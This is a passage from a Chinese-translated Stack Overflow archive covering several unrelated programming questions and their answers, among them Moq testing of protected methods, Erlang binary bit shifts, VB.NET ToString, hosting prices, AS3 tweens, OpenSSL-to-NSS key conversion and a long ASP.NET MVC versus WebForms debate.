  protected override void ChildMethod1()
  {
    //do something
  } 

  protected override void ChildMethod2()
  {
    //do something completely different
  }

} 
```

我正在使用 Moq，我想编写一个测试来验证当我调用 BaseMethod() 并且 runMethod1 为 true 时正在调用 ChildMethod1()。是否可以使用 Moq 创建 TestBase 的实现，调用 BaseMethod() 并验证在 Moq 实现上调用了 ChildMethod？

```
[Test]
public BaseMethod_should_call_correct_child_method()
{
  TestBase testBase;

  //todo: get a mock of TestBase into testBase variable

  testBase.runMethod1 = true;

  testBase.BaseMethod();

  //todo: verify that ChildMethod1() was called

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-03T03:52:29.487

您还可以将期望/设置设置为可验证，而无需严格模拟：

```
 //expect that ChildMethod1() will be called once. (it's protected)
  testBaseMock.Protected().Expect("ChildMethod1")
    .AtMostOnce()
    .Verifiable();

  ...

  //make sure the method was called
  testBase.Verify(); 
```

**编辑** 此语法在当前版本的 Moq 中不起作用。从至少 4.0.10827 开始，请参阅[此问题以了解如何执行此操作](https://stackoverflow.com/questions/3728873/verify-the-number-of-times-a-protected-method-is-called-using-moq)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-24T18:48:00.883

我想出了如何做到这一点。您可以使用 Moq 模拟受保护的方法，并且通过严格模拟，您可以验证它们是否被调用。现在我可以测试基类而无需创建任何子类。

```
[Test]
public BaseMethod_should_call_correct_child_method()
{
  //strict mocks will make sure all expectations are met
  var testBaseMock = new Mock<TestBase>(MockBehavior.Strict);

  //expect that ChildMethod1() will be called once. (it's protected)
  testBaseMock.Protected().Expect("ChildMethod1")
    .AtMostOnce();

  var testBase = testBaseMock.Object;

  testBase.runMethod1 = true;
  testBase.BaseMethod();

  //make sure the method was called
  testBase.VerifyAll();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T03:51:45.997

这有点 hack，但是创建一个 TestBase 的子类，将 ChildMethod1 和 ChildMethod 公开，然后 Moqing 怎么样？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T02:47:34.707

似乎您在测试行为而不是公共接口。如果这是有意的，那么您可能会查看测试私人成员的建议。

“是否可以使用 Moq 创建 TestBase 的实现，调用 BaseMethod() 并验证在 Moq 实现上调用了 ChildMethod？”

这有点可能。但随后您将测试模拟对象，而不是真实对象。

两个问题可能会引导您朝着正确的方向前进：

1.  descendatn 类返回的值是否与基类不同？如果是这样，您可以对此进行测试并忽略实施细节（也使重构更容易）。

2.  后代类是否调用不同的方法或不同的依赖项？如果是这样，您可以检查依赖项。

# binary - 二进制格式，存在按位运算吗？例如。<<16#7F, 16#FF>> bsl 1

> ID：390641
> 
> 赞同：8
> 
> 时间：2008-12-24T02:31:02.540
> 
> 标签：binary, erlang, xor

在erlang中，有对整数进行按位运算，例如：

```
1>  127 bsl 1.
254 
```

还可以将整数打包成字节序列

```
<< 16#7F, 16#FF >>
```

是否有可能，或者是否有任何运算符或 BIF 可以对二进制打包数据执行按位运算（例如 AND、OR、XOR、SHL、SHR）？

例如（如果 bsl 处理二进制包 - 它没有）：

```
1>  << 16#7F, 16#FF >> bsl 1.
<< 255, 254 >>
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-29T08:41:53.023

试试这种方式：

```
bbsl(Bin,Shift) -> <<_:Shift,Rest/bits>> = Bin, <<Rest/bits,0:Shift>>. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T04:05:12.680

使用 Erlang 的无界整数大小，我们可以做到这一点：

```
1> Bits = <<16#0FFFFFFF:(4*8)>>.
<<15,255,255,255>>

2> size(Bits).
4

3> Size=size(Bits)*8.
32

4> <<Num:Size>> = Bits.
<<15,255,255,255>>

5> Num.
268435455

6> Num2 = Num bsl 4.
4294967280

7> Bits2 = <<Num2:Size>>.
<<"ÿÿÿð">>

8> <<A:8,B:8,C:8,D:8>>=Bits2.
<<"ÿÿÿð">>

9> A.
255

10> D.
240 
```

正如我们所料。

请注意，在我的解决方案中，我通过将 4 个“0”添加到存储在二进制文件中的初始字符串（16#0F ... 前 4 个位置为 0）来预测我需要多少班次（4）

如果我不得不转移到二进制容器的“边界”之外，我不确定我会如何处理它，我猜你只会用 2^Size-1 进行与。

# vb.net - VB.NET 中的 ToString 与 ToString()

> ID：390648
> 
> 赞同：15
> 
> 时间：2008-12-24T02:40:55.767
> 
> 标签：vb.net

在 VB.NET 中使用 ToString 和 ToString() 有什么区别？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2008-12-24T02:45:02.310

没有。VB.NET 允许您排除任何不带参数的方法上的括号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-15T15:28:03.390

现有答案是完全正确的，但不包括 ToString 何时用作方法。这本质上是不正确的编码，但有可能

```
Dim sbrBuilder as New StringBuilder

...

sbrBuilder.ToString()
return sbrBuilder.ToString 
```

第一个 ToString （什么都不做）不会产生错误，但括号是由 IDE 强加的。第二个 ToString 不需要括号（可选 - 正如答案中已经解释的那样），因为它用于收集 ToString 的值。

希望这会帮助任何想知道为什么 IDE 不断在 ToString 上添加括号的人 - 然后你会意识到你忘记将它分配给我所做的任何事情

# windows - 为什么 Windows 和 Linux 托管服务之间的定价差异如此之大

> ID：390649
> 
> 赞同：2
> 
> 时间：2008-12-24T02:42:08.480
> 
> 标签：windows, linux, shared-hosting

我是付费的 .Net 开发人员，但我的个人网站托管在一个共享托管服务提供商的 LAMP 堆栈上。我一直在寻找使用 .Net 托管服务提供商切换到 Windows 的机会，但真正让我失望的是价格。我想切换的原因是我发现在.Net 上进行开发更有趣，而且我更喜欢使用.Net 而不是PHP。

使用我目前的 Linux 托管服务提供商，每月只需 10 美元，我就可以获得比在个人网站上使用的更多的带宽和磁盘空间。我目前分配了 380 GB 的空间和 7700 GB 的传输。虽然我意识到我永远不可能达到这些限制，尤其是在设置了 CPU 使用限制的情况下，但很高兴在我的网站上放一堆图片而不必担心空间不足。

但是，以我从 Windows 主机上看到的产品为例，每月 17 美元，我只能获得 2 GB 的磁盘空间和 200 GB 的传输。传输限制似乎在我一个月内使用的范围内，但 2 GB 的磁盘空间似乎非常低。特别是因为只有 400 MB 可用于 SQL Server 数据库。

因此，对于这个问题，足够的背景知识是定价差异仅与支付 Windows 和 SQL Server 许可证的成本相关，或者还有其他一些我没有考虑纳入 Windows 托管计划的成本。我的 Linux 主机得到了很好的服务，所以我认为这不是运行各种托管站点的人员的质量问题。软件许可的成本真的有那么大的不同吗？

如果定价是由于许可成本，您为什么不看到更多使用 Windows 和 .Net 的主机，但可以使用 PostgreSQL 或 MySQL 等替代数据库将定价保持在最低水平，它们提供基本相同的功能。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-12-24T02:46:07.847

我认为这与两个主要问题有关：
1）许可，这是一个显而易见的问题，主机会向您收取更多费用，因为他必须为 windows 和 SQLServer 付费。
2）硬件，运行windows需要更多的资源来减少虚拟主机，而vps可以在与linux服务器相同数量的硬件上运行。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-12-24T02:44:54.980

因为 Windows Server 和 SQL Server 许可证的每个*CPU 核心*（而不仅仅是每台机器）的成本很高，所以您的托管服务提供商需要为许可证收回成本*。*

 *这超出了通常的操作开销（这是 Linux 服务器唯一涵盖的内容）。

我也感受到你的痛苦，因为我为我妻子的业务维护了一个站点，虽然我还没有完成她用 ASP.NET 编写的面向客户的前端应用程序，但我必须首先坚持 LAMP 托管，这足以满足片刻。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-24T23:21:43.313

除了许可费用之外，还要考虑系统管理员。你可能需要更少的系统管理员来维护一大堆 linux 服务器，而不是你为 windows 做的。这笔费用将转嫁给您。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-30T03:22:52.590

Mosso Cloud Sites 产品可以在 LAMP 和 .NET 之间切换，而无需更改价格。从 MySQL 切换到 MS SQL 的价格差异为 5 美元/月，但如果价格是一个问题，.NET 显然可以与 MySQL 一起使用。我提到这个产品是因为您的要求（磁盘空间和带宽）不会因技术而异。

免责声明：我是 Rackspace 员工，Mosso 是 Rackspace 公司。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-02-12T15:34:31.473

这并不是您问题的真正答案（其他人已经做得很好），但是您是否考虑过将可能占用大部分磁盘空间的静态资源卸载到 Amazon 的 S3 之类的东西上? 这样，只有您的应用程序代码和数据库将存储在 Windows 主机上。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-24T03:11:36.860

这个问题很可能更适合 ISP 供应商而不是程序员。这个问题很容易引发微软与 OSS 的通常圣战。我自己的观察与你的相似。ISP 更喜欢 LAMP 而不是 Windows。

我曾使用过这两种堆栈，恕我直言，纵观全局，在我看来，Microsoft 技术和许可旨在针对 Intranet 开发市场。因此，TCO 看起来对 Internet 应用程序不太有利。

我并不是说您不能使用 .NET 应用程序堆栈编写一个真正出色的 Internet 应用程序。当然可以。只是从 TCO 的角度来看，LAMP 更适合 ISP 遇到的各种工作负载。

这不是对微软的批评。他们有股东利益需要保护。所谓企业开发的利润率高于 ISP 最擅长服务的客户类型。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-24T03:20:54.890

*“因为他们可以”*

严肃地说，它被称为“自由市场”。一探究竟！

编辑：

[叹气] 很遗憾，这么多路过的投票者没有幽默感……也没有经济学知识。所以让我解释一下：

一种理论是“Linux 是免费的，Windows 是要花钱的”。虽然是真的，但这并不能解释差异，因为 windows 是固定成本。

能解释差异的是*自由市场*。-

*   有人可能会争辩说，典型的 linux 用户~~是一个小气鬼~~，不愿意为托管服务支付太多费用，因为他们知道用于托管的软件不会花费主机任何费用，而典型的 windows 用户~~是一个傻瓜~~，愿意为托管服务支付更多费用托管服务，因为他们知道用于托管的软件会花费主机资金。
*   但实际上，由于硬件、软件，甚至带宽容量的成本都是固定成本，以上只是站不住脚——主机的相对固定成本与大型托管公司无关

因此，价格变成目标市场愿意支付的任何价格，与主机在展示其质量和其他“附加价值”主张方面的表现相平衡。

例如，我曾经在便宜的 LAMP 主机上托管我的网站，因为它只是一些静态 html。当网站进入电子商务时，我研究了廉价主机提供的“免费”电子商务包，发现*它们都有严重的安全漏洞*，因此决定使用 asp.net 并编写我自己的电子商务代码，因为（ a）我知道 asp.net，（b）无论如何我都需要学习如何做到这一点，并且（c）我比其他任何人都更信任我的代码 [或者至少如果我的代码中有缺陷，我有一个容易访问的人惹的祸！]。

不同的是托管计划是*每月几美元*。新主机的正常运行时间似乎更好，但他们的一些技术支持很蹩脚，他们缺少一些明显的功能，但没有什么是我无法解决的（无需在其他地方支付更多费用）所以最后我很乐意支付多一点。我选择的主机不是最便宜的，也不是最贵的。我花了大约 10 分钟进行研究，因为对于我的网站来说它*并不那么重要*。

这就引出了下一个经济点：如果普通程序员的成本为 50 美元/小时，那么利用该程序员的时间来抱怨每月 7 美元的托管费用是否划算？

总之，答案是：自由市场。

编辑2：

[以下是一些 Windows 服务器许可证价格](http://www.microsoft.com/windowsserver2003/howtobuy/licensing/pricing.mspx)

这些对我来说当然看起来像是一次性的固定成本，但即使这是一笔年费，与托管服务的硬件和带宽成本相比，它仍然相形见绌。

许可成本和托管成本之间的关系充其量是间接的，与市场压力相比基本上是无关紧要的。

但是请不要相信任何程序员的话，*询问托管服务提供商*。

[托管服务的成本明细](http://www.onlinebusinessbasics.com/web-hosting/inexpensive.shtml)

附录：

MS-SQL 许可证确实需要额外的 $$$，因此这可能是一个因素

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-12-24T03:39:41.687

几乎与其他人在这里所说的相呼应。但是每月7美元的差异真的有那么大的差异吗？我知道您获得的磁盘空间和带宽更少，但 7 美元对于支付许可成本来说并不算多。

# asp.net - ASP.Net 应用程序加载缓慢 - VS2008

> ID：390659
> 
> 赞同：0
> 
> 时间：2008-12-24T02:49:04.783
> 
> 标签：asp.net, visual-studio-2008

这是我在舞台服务器上的设置

编译了我的网络应用程序

发布的网站

将输出目录从我的机器复制到暂存服务器

创建域帐户

在静态 IP 上创建虚拟站点

网站在创建的域帐户下运行

模拟设置太真，因为 Windows 集成身份验证与 sql server 一起使用

现在我第一次访问我的舞台站点时，页面加载速度很慢，我理解，但后续请求确实需要一段时间才能加载页面。

计划运行钢丝鲨，看看交通情况。还有什么我应该寻找的吗？

注意：我的 IIS 和 SQL 在同一台机器上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-24T03:09:40.763

您应该通过分析器运行它，看看它花费了这么多时间。SQL Server 包含它自己的漂亮查询分析器，如果您想要一个免费的 .net 分析器，可以使用[nprof](http://nprof.sourceforge.net/Site/Description.html)。如果您想为 .Net 支付分析器费用，并且从长远来看可能是值得的，这里有很多不错的产品可供选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T13:42:00.860

你能定义慢吗？多少秒？

绝对检查对 sql server 的查询以查看它们在做什么。

总是有任务管理器，看看cpu/memory。例如，固定一个 cpu 并不难。服务器上还有什么？

当遇到问题时，我总是喜欢有一个空的 aspx 页面来消除其他问题。

# flash - as3 tween - 我如何避免带有阴影的图像直接变黑？

> ID：390675
> 
> 赞同：0
> 
> 时间：2008-12-24T03:21:28.260
> 
> 标签：flash, actionscript-3

我正在使用 AS3 在周围有阴影的多个图像之间创建补间效果——效果很好，除了 3 次以上补间后，阴影开始变得越来越暗——这是有道理的，但我并不是真的想要发生.

理想情况下，我想在 2 张图像之间进行补间，在第 3 次清除它还是什么？我对 AS3 比较陌生，所以我确定这是一个新手错误 :-)

我采取的步骤是： 1.）在 AS3 中从 xml 文档 int xml 类加载图像 2.）在计时器事件中，加载新图像并调用以下补间方法：

```
tweener = new Tween(mcSlideHolder1, "alpha", None.easeNone,0,1,2,true); 
```

如果不清楚，请告诉我，我试图进行描述，但它有点粗糙，因为我不是 AS3 专家 :-)

更新：我可以通过添加以下内容来清除和停止堆叠效果：

```
while( nameOfContainer.numChildren > 0 )
       nameOfContainer.removeChildAt( 0 ); 
```

...但如果我这样做，我会失去从一个图像转换到另一个图像的酷炫效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-24T08:06:52.583

你可以试试这个：不是单独对每个图像应用阴影过滤器，而是让所有图像包含在一个影片剪辑中，并将阴影过滤器应用于该影片剪辑（删除图像上的所有阴影）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T11:44:48.650

您还没有显示所有代码，因此很难判断发生了什么。但是，如果它继续变得越来越暗，那么我就会相信图像正在一遍又一遍地加载。请提供更多可用代码，尤其是 XML 完整处理程序函数，以及将子项添加到显示列表的位置。我们只需要调整您的代码以仅在初始时间添加这些项目，然后在显示列表中旋转它们，或者不断删除最后查看的内容，以便下次可以再次导入而不会出现额外的黑色/出血。

如果您有一个在这些图像中加载的函数，那么该函数会再次被调用，它会在第一个导致变暗/出血的顶部再次加载资产。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-04T09:40:05.183

不确定它是否相关，但可能是您的阴影渐变是一个大对象，中心较暗，然后向边缘消散，然后阴影是此渐变的蒙版。因此，如果您的阴影靠近中心，它们会显得更暗，因为它们允许显示渐变的较暗部分。

# cryptography - 将 OpenSSL 公钥转换为 NSS 1

> ID：390677
> 
> 赞同：1
> 
> 时间：2008-12-24T03:22:58.850
> 
> 标签：cryptography, openssl, nss

如何将 OpenSSL 生成的公钥转换为一个 NSS 可以理解的？我使用 OpenSSL 生成了密钥，将其导出为 pkcs12 格式，将其导入 NSS 数据库，然后使用 McCoy 实用程序提取公钥。这让我大吃一惊。这可能是编码的问题，但我应该使用哪一个？

更新：看起来 OpenSSL内部**包含**NSS 密钥，所以问题是 - 我如何找出 OpenSSL 密钥的哪一部分也是 NSS 密钥？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T04:42:22.213

```
openssl x509 -in mycert.pem -pubkey 
```

做得很好

# asp.net-mvc - 我旁边的任何人都没有获得 ASP.NET MVC 吗？

> ID：390693
> 
> 赞同：141
> 
> 时间：2008-12-24T03:43:53.673
> 
> 标签：asp.net-mvc

自 CTP 以来，我一直在摆弄 ASP.NET MVC，我喜欢他们所做的很多事情，但有些事情我就是不明白。

例如，我下载了 beta1，我正在用它制作一个小小的个人网站/简历/博客。以下是 ViewSinglePost 视图的片段：

```
 <%
        // Display the "Next and Previous" links
        if (ViewData.Model.PreviousPost != null || ViewData.Model.NextPost != null)
        {
            %> <div> <%

            if (ViewData.Model.PreviousPost != null)
            {
                %> <span style="float: left;"> <%
                    Response.Write(Html.ActionLink("<< " + ViewData.Model.PreviousPost.Subject, "view", new { id = ViewData.Model.PreviousPost.Id }));
                %> </span> <%
            }

            if (ViewData.Model.NextPost != null)
            {
                %> <span style="float: right;"> <%
                    Response.Write(Html.ActionLink(ViewData.Model.NextPost.Subject + " >>", "view", new { id = ViewData.Model.NextPost.Id }));
                %> </span> <%
            }
            %>
                   <div style="clear: both;" />
               </div> <%
        }
    %> 
```

恶心！**（另请注意，HTML 中有临时占位符 HTML，一旦功能正常，我将进行实际设计）**。

难道我做错了什么？因为我在经典的 ASP 中度过了许多黑暗的日子，而这个标签汤让我强烈地想起了它。

每个人都在宣扬如何制作更简洁的 HTML。你猜怎么了？1% 的人查看输出的 HTML。对我来说，我不在乎 Webforms 是否会在呈现的 HTML 中弄乱我的缩进，只要我有易于维护的代码……这不是！

所以，请转换我，一个顽固的网络表单人，为什么我要为此放弃我格式良好的 ASPX 页面？

**编辑：**将“temp Html/css”行加粗，这样人们就会对此感到厌烦。

* * *

## 回答 #1

> 赞同：152
> 
> 时间：2008-12-24T04:57:54.337

与 Web 表单相比，MVC 同时是一种较低级别的 HTML 生成方法，可以更好地控制页面输出*，同时也是*一种更高级别、更受架构驱动的方法。让我捕捉 Web Forms 和 MVC 并说明为什么我认为在许多情况下比较有利于 Web Forms - 只要您不陷入一些经典的 Web Forms 陷阱。

**网络表格**

在 Web 窗体模型中，您的页面直接对应于来自浏览器的页面请求。因此，如果您将用户引导至书籍列表，您可能会在某处有一个名为“Booklist.aspx”的页面，您将引导他访问该页面。在该页面中，您必须提供显示该列表所需的一切。这包括用于提取数据、应用任何业务逻辑和显示结果的代码。如果有任何架构或路由逻辑影响页面，您还必须在页面上编写架构逻辑代码。 *良好*的 Web 窗体开发通常涉及在单独的（可单元测试的）DLL 中开发一组支持类。这些类将处理业务逻辑、数据访问和架构/路由决策。

**MVC**

MVC 对 Web 应用程序开发采取了更“架构”的观点：提供了一个标准化的脚手架来构建。它还提供了用于在已建立的体系结构中自动生成模型、视图和控制器类的工具。例如，在 Ruby on Rails（以下简称“Rails”）和 ASP.NET MVC 中，您总是从反映其 Web 应用程序架构整体模型的目录结构开始。要添加视图、模型和控制器，您将使用像 Rails 的“Rails 脚本/生成脚手架 {modelname}”这样的命令（ASP.NET MVC 在 IDE 中提供了类似的命令）。在生成的控制器类中，会有 Index（显示列表）、Show、New 和 Edit 和 Destroy 的方法（“Actions”）（至少在 Rails 中，MVC 是类似的）。默认情况下，这些“

目录和文件的布局在 MVC 中很重要。例如，在 ASP.NET MVC 中，“Book”对象的*Index*方法可能只有一行：“Return View();” 通过 MVC 的魔力，这会将 Book 模型发送到“/View/Books/Index.aspx”页面，您可以在其中找到显示 Books 的代码。Rails 的方法与此类似，尽管逻辑更加明确且不那么“神奇”。MVC 应用程序中的*视图*页面通常比 Web 窗体页面更简单，因为它们不必担心路由、业务逻辑或数据处理。

**比较**

MVC 的优势在于清晰的关注点分离和更清晰、更以 HTML/CSS/AJAX/Javascript 为中心的模型来生成输出。这增强了可测试性，提供了更标准化的设计，并为更“Web 2.0”类型的网站打开了大门。

然而，也有一些显着的缺点。

首先，虽然演示站点很容易运行，但整体架构模型具有显着的学习曲线。当他们说“约定优于配置”时，这听起来不错——直到你意识到你有一本值得学习的约定。此外，弄清楚发生了什么通常有点令人抓狂，因为您*依赖*的是魔术而不是显式调用。例如，“返回视图（）；” 在上面打电话？可以在其他操作中找到完全相同的调用，但*它们会转到不同的位置。*如果你了解*MVC 约定*那么你知道为什么这样做了。但是，它当然不能作为良好命名或易于理解的代码的示例，而且对于新开发人员来说，它比 Web 表单更难上手（这不仅仅是意见：去年我有一个暑期实习生学习 Web 表单今年和 MVC 在生产力上的差异很明显——有利于 Web 表单）。顺便说一句，Rails 在这方面要好一些，尽管 Ruby on Rails 具有动态命名的方法，这些方法也需要一些认真的习惯。

其次，MVC 隐含地假设您正在构建一个经典的 CRUD 风格的网站。架构决策，尤其是代码生成器，都是为了支持这种类型的 Web 应用程序而构建的。如果您正在构建一个 CRUD 应用程序并希望采用经过验证的架构（或者只是不喜欢架构设计），那么您可能应该考虑 MVC。但是，如果您要做的不仅仅是 CRUD 和/或您对架构相当胜任，那么在您真正掌握底层路由模型之前，MVC 可能会感觉像是一件紧身衣（这比在 WebForms 应用程序中简单地路由要复杂得多）。即便如此，我仍然觉得自己一直在与模型作斗争，并担心会出现意想不到的结果。

第三，如果您[不关心 Linq](https://stackoverflow.com/questions/458802/doesnt-linq-to-sql-miss-the-point-arent-orm-mappers-subsonic-etc-sub-opti)（或者因为您担心 Linq-to-SQL 会消失，或者因为您发现 Linq-to-Entities 可笑地过度生产和供电不足），那么您也不想要走这条路，因为 ASP.NET MVC 脚手架工具是围绕 Linq 构建的（这对我来说是杀手）。如果您有 SQL 经验（特别是如果您精通 TSQL 和存储过程！），Rails 的数据模型也相当笨拙。

第四，MVC 支持者经常指出，MVC 视图在精神上更接近 Web 的 HTML/CSS/AJAX 模型。例如，“HTML Helpers”——在你的 vew 页面中交换内容并将其放入 HTML 控件的小代码调用——与 Javascript 集成比 Web 窗体控件更容易。但是，ASP.NET 4.0 引入了命名控件的功能，因此在很大程度上消除了这一优势。

第五，MVC 纯粹主义者经常嘲笑 Viewstate。在某些情况下，他们这样做是正确的。然而，Viewstate 也可以是一个很好的工具，并且可以提高生产力。相比之下，处理 Viewstate比尝试在 MVC 应用程序中集成第三方 Web 控件要容易得多*。*虽然 MVC 的控件集成可能会变得更容易，但我所看到的所有当前努力都需要构建（有些令人讨厌的）代码以将这些控件链接回视图的 Controller 类（即 -*围绕*MVC 模型工作）。

**结论**

我在很多方面都喜欢 MVC 开发（尽管我更喜欢 Rails 而不是 ASP.NET MVC）。我还认为重要的是我们不要陷入认为 ASP.NET MVC 是 ASP.NET Web 窗体的“反模式”的陷阱。它们是不同的，但不是完全陌生的，当然两者都有空间。

但是，我更喜欢 Web 表单开发，因为*对于大多数任务*来说，完成任务更容易（例外是生成一组 CRUD 表单）。在某种程度上，MVC 似乎也受到了*过度理论的影响。* 事实上，看看那些了解面向页面的 ASP.NET 但正在尝试 MVC 的人在 SO 上提出的许多问题。无一例外，当开发人员发现他们无法完成基本任务时，他们会咬牙切齿，因为他们必须跳过障碍或忍受巨大的学习曲线。*在我的书中，这*就是 Web Forms 优于 MVC 的原因：MVC 让你付出*真实**世界的代价*，以获得更多的可测试性，或者更糟糕的是，因为你使用的是**最新技术。**

 *更新：我在评论部分受到了严厉的批评——其中一些相当公平。因此，我花了几个月的时间学习 Rails 和 ASP.NET MVC，只是为了确保我没有真正错过下一件大事！当然，这也有助于确保我对问题做出平衡和适当的回答。您应该知道，如果评论似乎不同步，上述回复是对我最初答案的重大改写。

当我更仔细地研究 MVC 时，我想，有一段时间，我最终会遇到一个重大的过失。最后我得出的结论是，虽然我认为我们需要在 Web 窗体架构和可测试性上花费更多的精力，但 MVC 确实没有为我响应号召。因此，向那些对我最初的答案提出明智批评的人们表示衷心的“谢谢”。

至于那些将其视为一场*宗教斗争*并无情地策划投票泛滥的人，我不明白您为什么要打扰（多次在几秒钟内投反对票超过 20 次当然是不正常的）。如果您正在阅读此答案并想知道我的答案是否真的“错误”，因为分数远低于其他一些答案，请放心，它更多地说明了一些不同意的人，而不是一般意义上的社区（总的来说，这个已经被投票超过 100 次）。

事实上，许多开发人员并不关心 MVC，事实上，这并不是少数人的观点（即使在 MS 内部，正如博客所表明的那样）。

* * *

## 回答 #2

> 赞同：117
> 
> 时间：2008-12-24T04:01:58.020

MVC 让您可以更好地控制您的输出，而这种控制带来了编写设计不佳的 HTML、标签汤等的更大风险......

但与此同时，您有几个以前没有的新选择……

1.  更多地控制页面和页面内的元素
2.  减少输出中的“垃圾”，例如 ViewState 或元素上的过长 ID *（不要误会，我喜欢 ViewState）*
3.  更好地使用 Javascript 进行客户端编程（Web 2.0 应用程序有人吗？）
4.  不仅是 MVC，而且 JsonResult 也很灵巧……

现在这并不是说您不能使用 WebForms 做任何这些事情，但是 MVC 使它更容易。

当我需要快速创建 Web 应用程序时，我仍然使用 WebForms，因为我可以利用服务器控件等。WebForms 隐藏了输入标签和提交按钮的所有细节。

如果您不小心，WebForms 和 MVC 都会产生绝对的垃圾。与往常一样，仔细规划和深思熟虑的设计将产生高质量的应用程序，无论它是 MVC 还是 WebForms。

**[更新]**

如果还有什么安慰的话，MVC 只是来自 Microsoft 的一项新的、不断发展的技术。有很多帖子称 WebForms 不仅会保留，而且会继续为……而开发。

[http://haacked.com](http://haacked.com/archive/2008/11/13/future-of-aspnet.aspx)

[http://www.misfitgeek.com](http://www.misfitgeek.com/Will+ASPNET+MVC+Be+The+Main+Web+UI+Platform+For+ASPNET.aspx)

[http://rachelappel.com](http://rachelappel.com/asp-net/asp-net-development-mvc-vs-web-forms/)

... 等等...

对于那些关心 MVC 正在走的路线的人，我建议给“伙计们”你的反馈。到目前为止，他们似乎在听！

* * *

## 回答 #3

> 赞同：76
> 
> 时间：2008-12-24T15:57:50.993

大多数对 ASP.NET MVC 的反对意见似乎都集中在视图上，这是架构中最“可选”和模块化的部分之一。[NVelocity](http://nvelocity.sourceforge.net/)、[NHaml](http://code.google.com/p/nhaml/)、[Spark](http://sparkviewengine.com/)、 XSLT 和其他视图引擎可以很[容易地换出](http://www.coderjournal.com/2009/05/creating-your-first-mvc-viewengine/)（每个版本都变得越来越容易）。其中许多具有更简洁的语法来执行表示逻辑和格式化，同时仍然可以完全控制发出的 HTML。

除此之外，几乎所有的批评似乎都归结为默认视图中的 <% %> 标记以及它有多“丑陋”。这种观点通常植根于习惯于 WebForms 方法，它只是将大部分经典的 ASP 丑陋移到代码隐藏文件中。

即使没有做“错误”的代码隐藏，你也会在Repeaters中拥有像OnItemDataBound这样的东西，它在美学上与“标签汤”*一样*丑陋，如果只是以不同的方式。即使在该循环的输出中嵌入变量，foreach 循环也更容易阅读，尤其是当您从其他非 ASP.NET 技术开始使用 MVC 时。理解 foreach 循环所需的 Google-fu 比弄清楚修改转发器中的一个字段的方法是弄乱 OnItemDataBound （以及检查它是否是要更改的正确元素的老鼠巢）要少得多。

ASP 标签汤驱动的“意大利面条”的最大问题更多是关于在 HTML 之间插入数据库连接之类的东西。

它碰巧使用 <% %> 只是与经典 ASP 的意大利面条性质相关，而不是因果关系。如果您将视图逻辑保留为 HTML/CSS/Javascript 以及进行*演示*所需的最小逻辑，那么剩下的就是语法。

在将给定的功能与 WebForms 进行比较时，请确保包含所有设计器生成的 C#、C# 隐藏代码以及 .aspx 代码，以确保 MVC 解决方案实际上并不简单得多.

当与对可重复的表示逻辑的部分视图的明智使用相结合时，它确实可以很好而且优雅。

就我个人而言，我希望早期的教程内容更多地关注这方面的事情，而不是几乎完全关注测试驱动、控制反转等。虽然其他的东西是专家们反对的，但那些在战壕里的人更有可能反对“标签汤”。

无论如何，这是一个仍处于测试阶段的平台。尽管如此，与大多数 Microsoft 测试版技术相比，它的部署和非 Microsoft 开发人员使用它构建实际东西的方式要多得多。因此，嗡嗡声往往使它看起来比它周围的基础设施（文档、指导模式等）更进一步。它在这一点上真正可用只会放大这种效果。

* * *

## 回答 #4

> 赞同：59
> 
> 时间：2008-12-24T06:59:00.473

```
<% if (Model.PreviousPost || Model.NextPost) { %>
    <div class="pager">
        <% if (Model.PreviousPost) { %>
            <span><% Html.ActionLink("<< " + Model.PreviousPost.Subject, "view")); %></span>
        <% } if (Model.NextPost) { %>
            <span><% Html.ActionLink(Model.NextPost.Subject + " >>", "view")); %></span>
        <% } %>
    </div>
<% } %> 
```

您可以在不包含嵌入式 CSS 的情况下发表另一篇文章，询问如何执行此操作。

注意： ViewData.Model 在下一版本中成为模型。

在用户控件的帮助下，这将成为

```
<% Html.RenderPartial("Pager", Model.PagerData) %> 
```

其中 PagerData 是通过操作处理程序中的匿名构造函数初始化的。

编辑：我很好奇你的 WebForm 实现对于这个问题会是什么样子。

* * *

## 回答 #5

> 赞同：25
> 
> 时间：2008-12-24T04:05:38.717

我不确定人们在什么时候不再关心他们的代码。

HTML 是您作品的最公开展示，有很多开发人员使用记事本、notepad++ 和其他纯文本编辑器来构建大量网站。

MVC 是关于从 Web 表单中取回控制权，在无状态环境中工作，并实现模型视图控制器设计模式，而无需在该模式的实现中通常发生的所有额外工作。

如果您想要控制、清洁代码并使用 MVC 设计模式，那么这是给您的，如果您不喜欢使用标记，不关心您的标记有多畸形，那么请使用 ASP.Net Web 窗体。

如果你不喜欢任何一个，你肯定会在标记中做同样多的工作。

**编辑** 我还应该声明 Web 表单和 MVC 有它们的位置，我绝不是说一个比另一个更好，只是每个 MVC 都有重新控制标记的力量。

* * *

## 回答 #6

> 赞同：15
> 
> 时间：2008-12-24T04:32:20.830

我认为你错过了一些东西。首先，不需要Response.Write，你可以使用`<%= %>`标签。其次，您可以编写自己的 HtmlHelper 扩展来执行常见操作。第三，一点点格式化有很大帮助。第四，所有这些都可能被困在一个用户控件中，以便在几个不同的视图之间共享，因此主视图中的整体标记更清晰。

我承认标记仍然不像人们希望的那样整洁，但是可以通过使用一些临时变量来大大清理它。

现在，这还不错，如果我不必为 SO 格式化它会更好。

```
 <%
    var PreviousPost = ViewData.Model.PreviousPost;
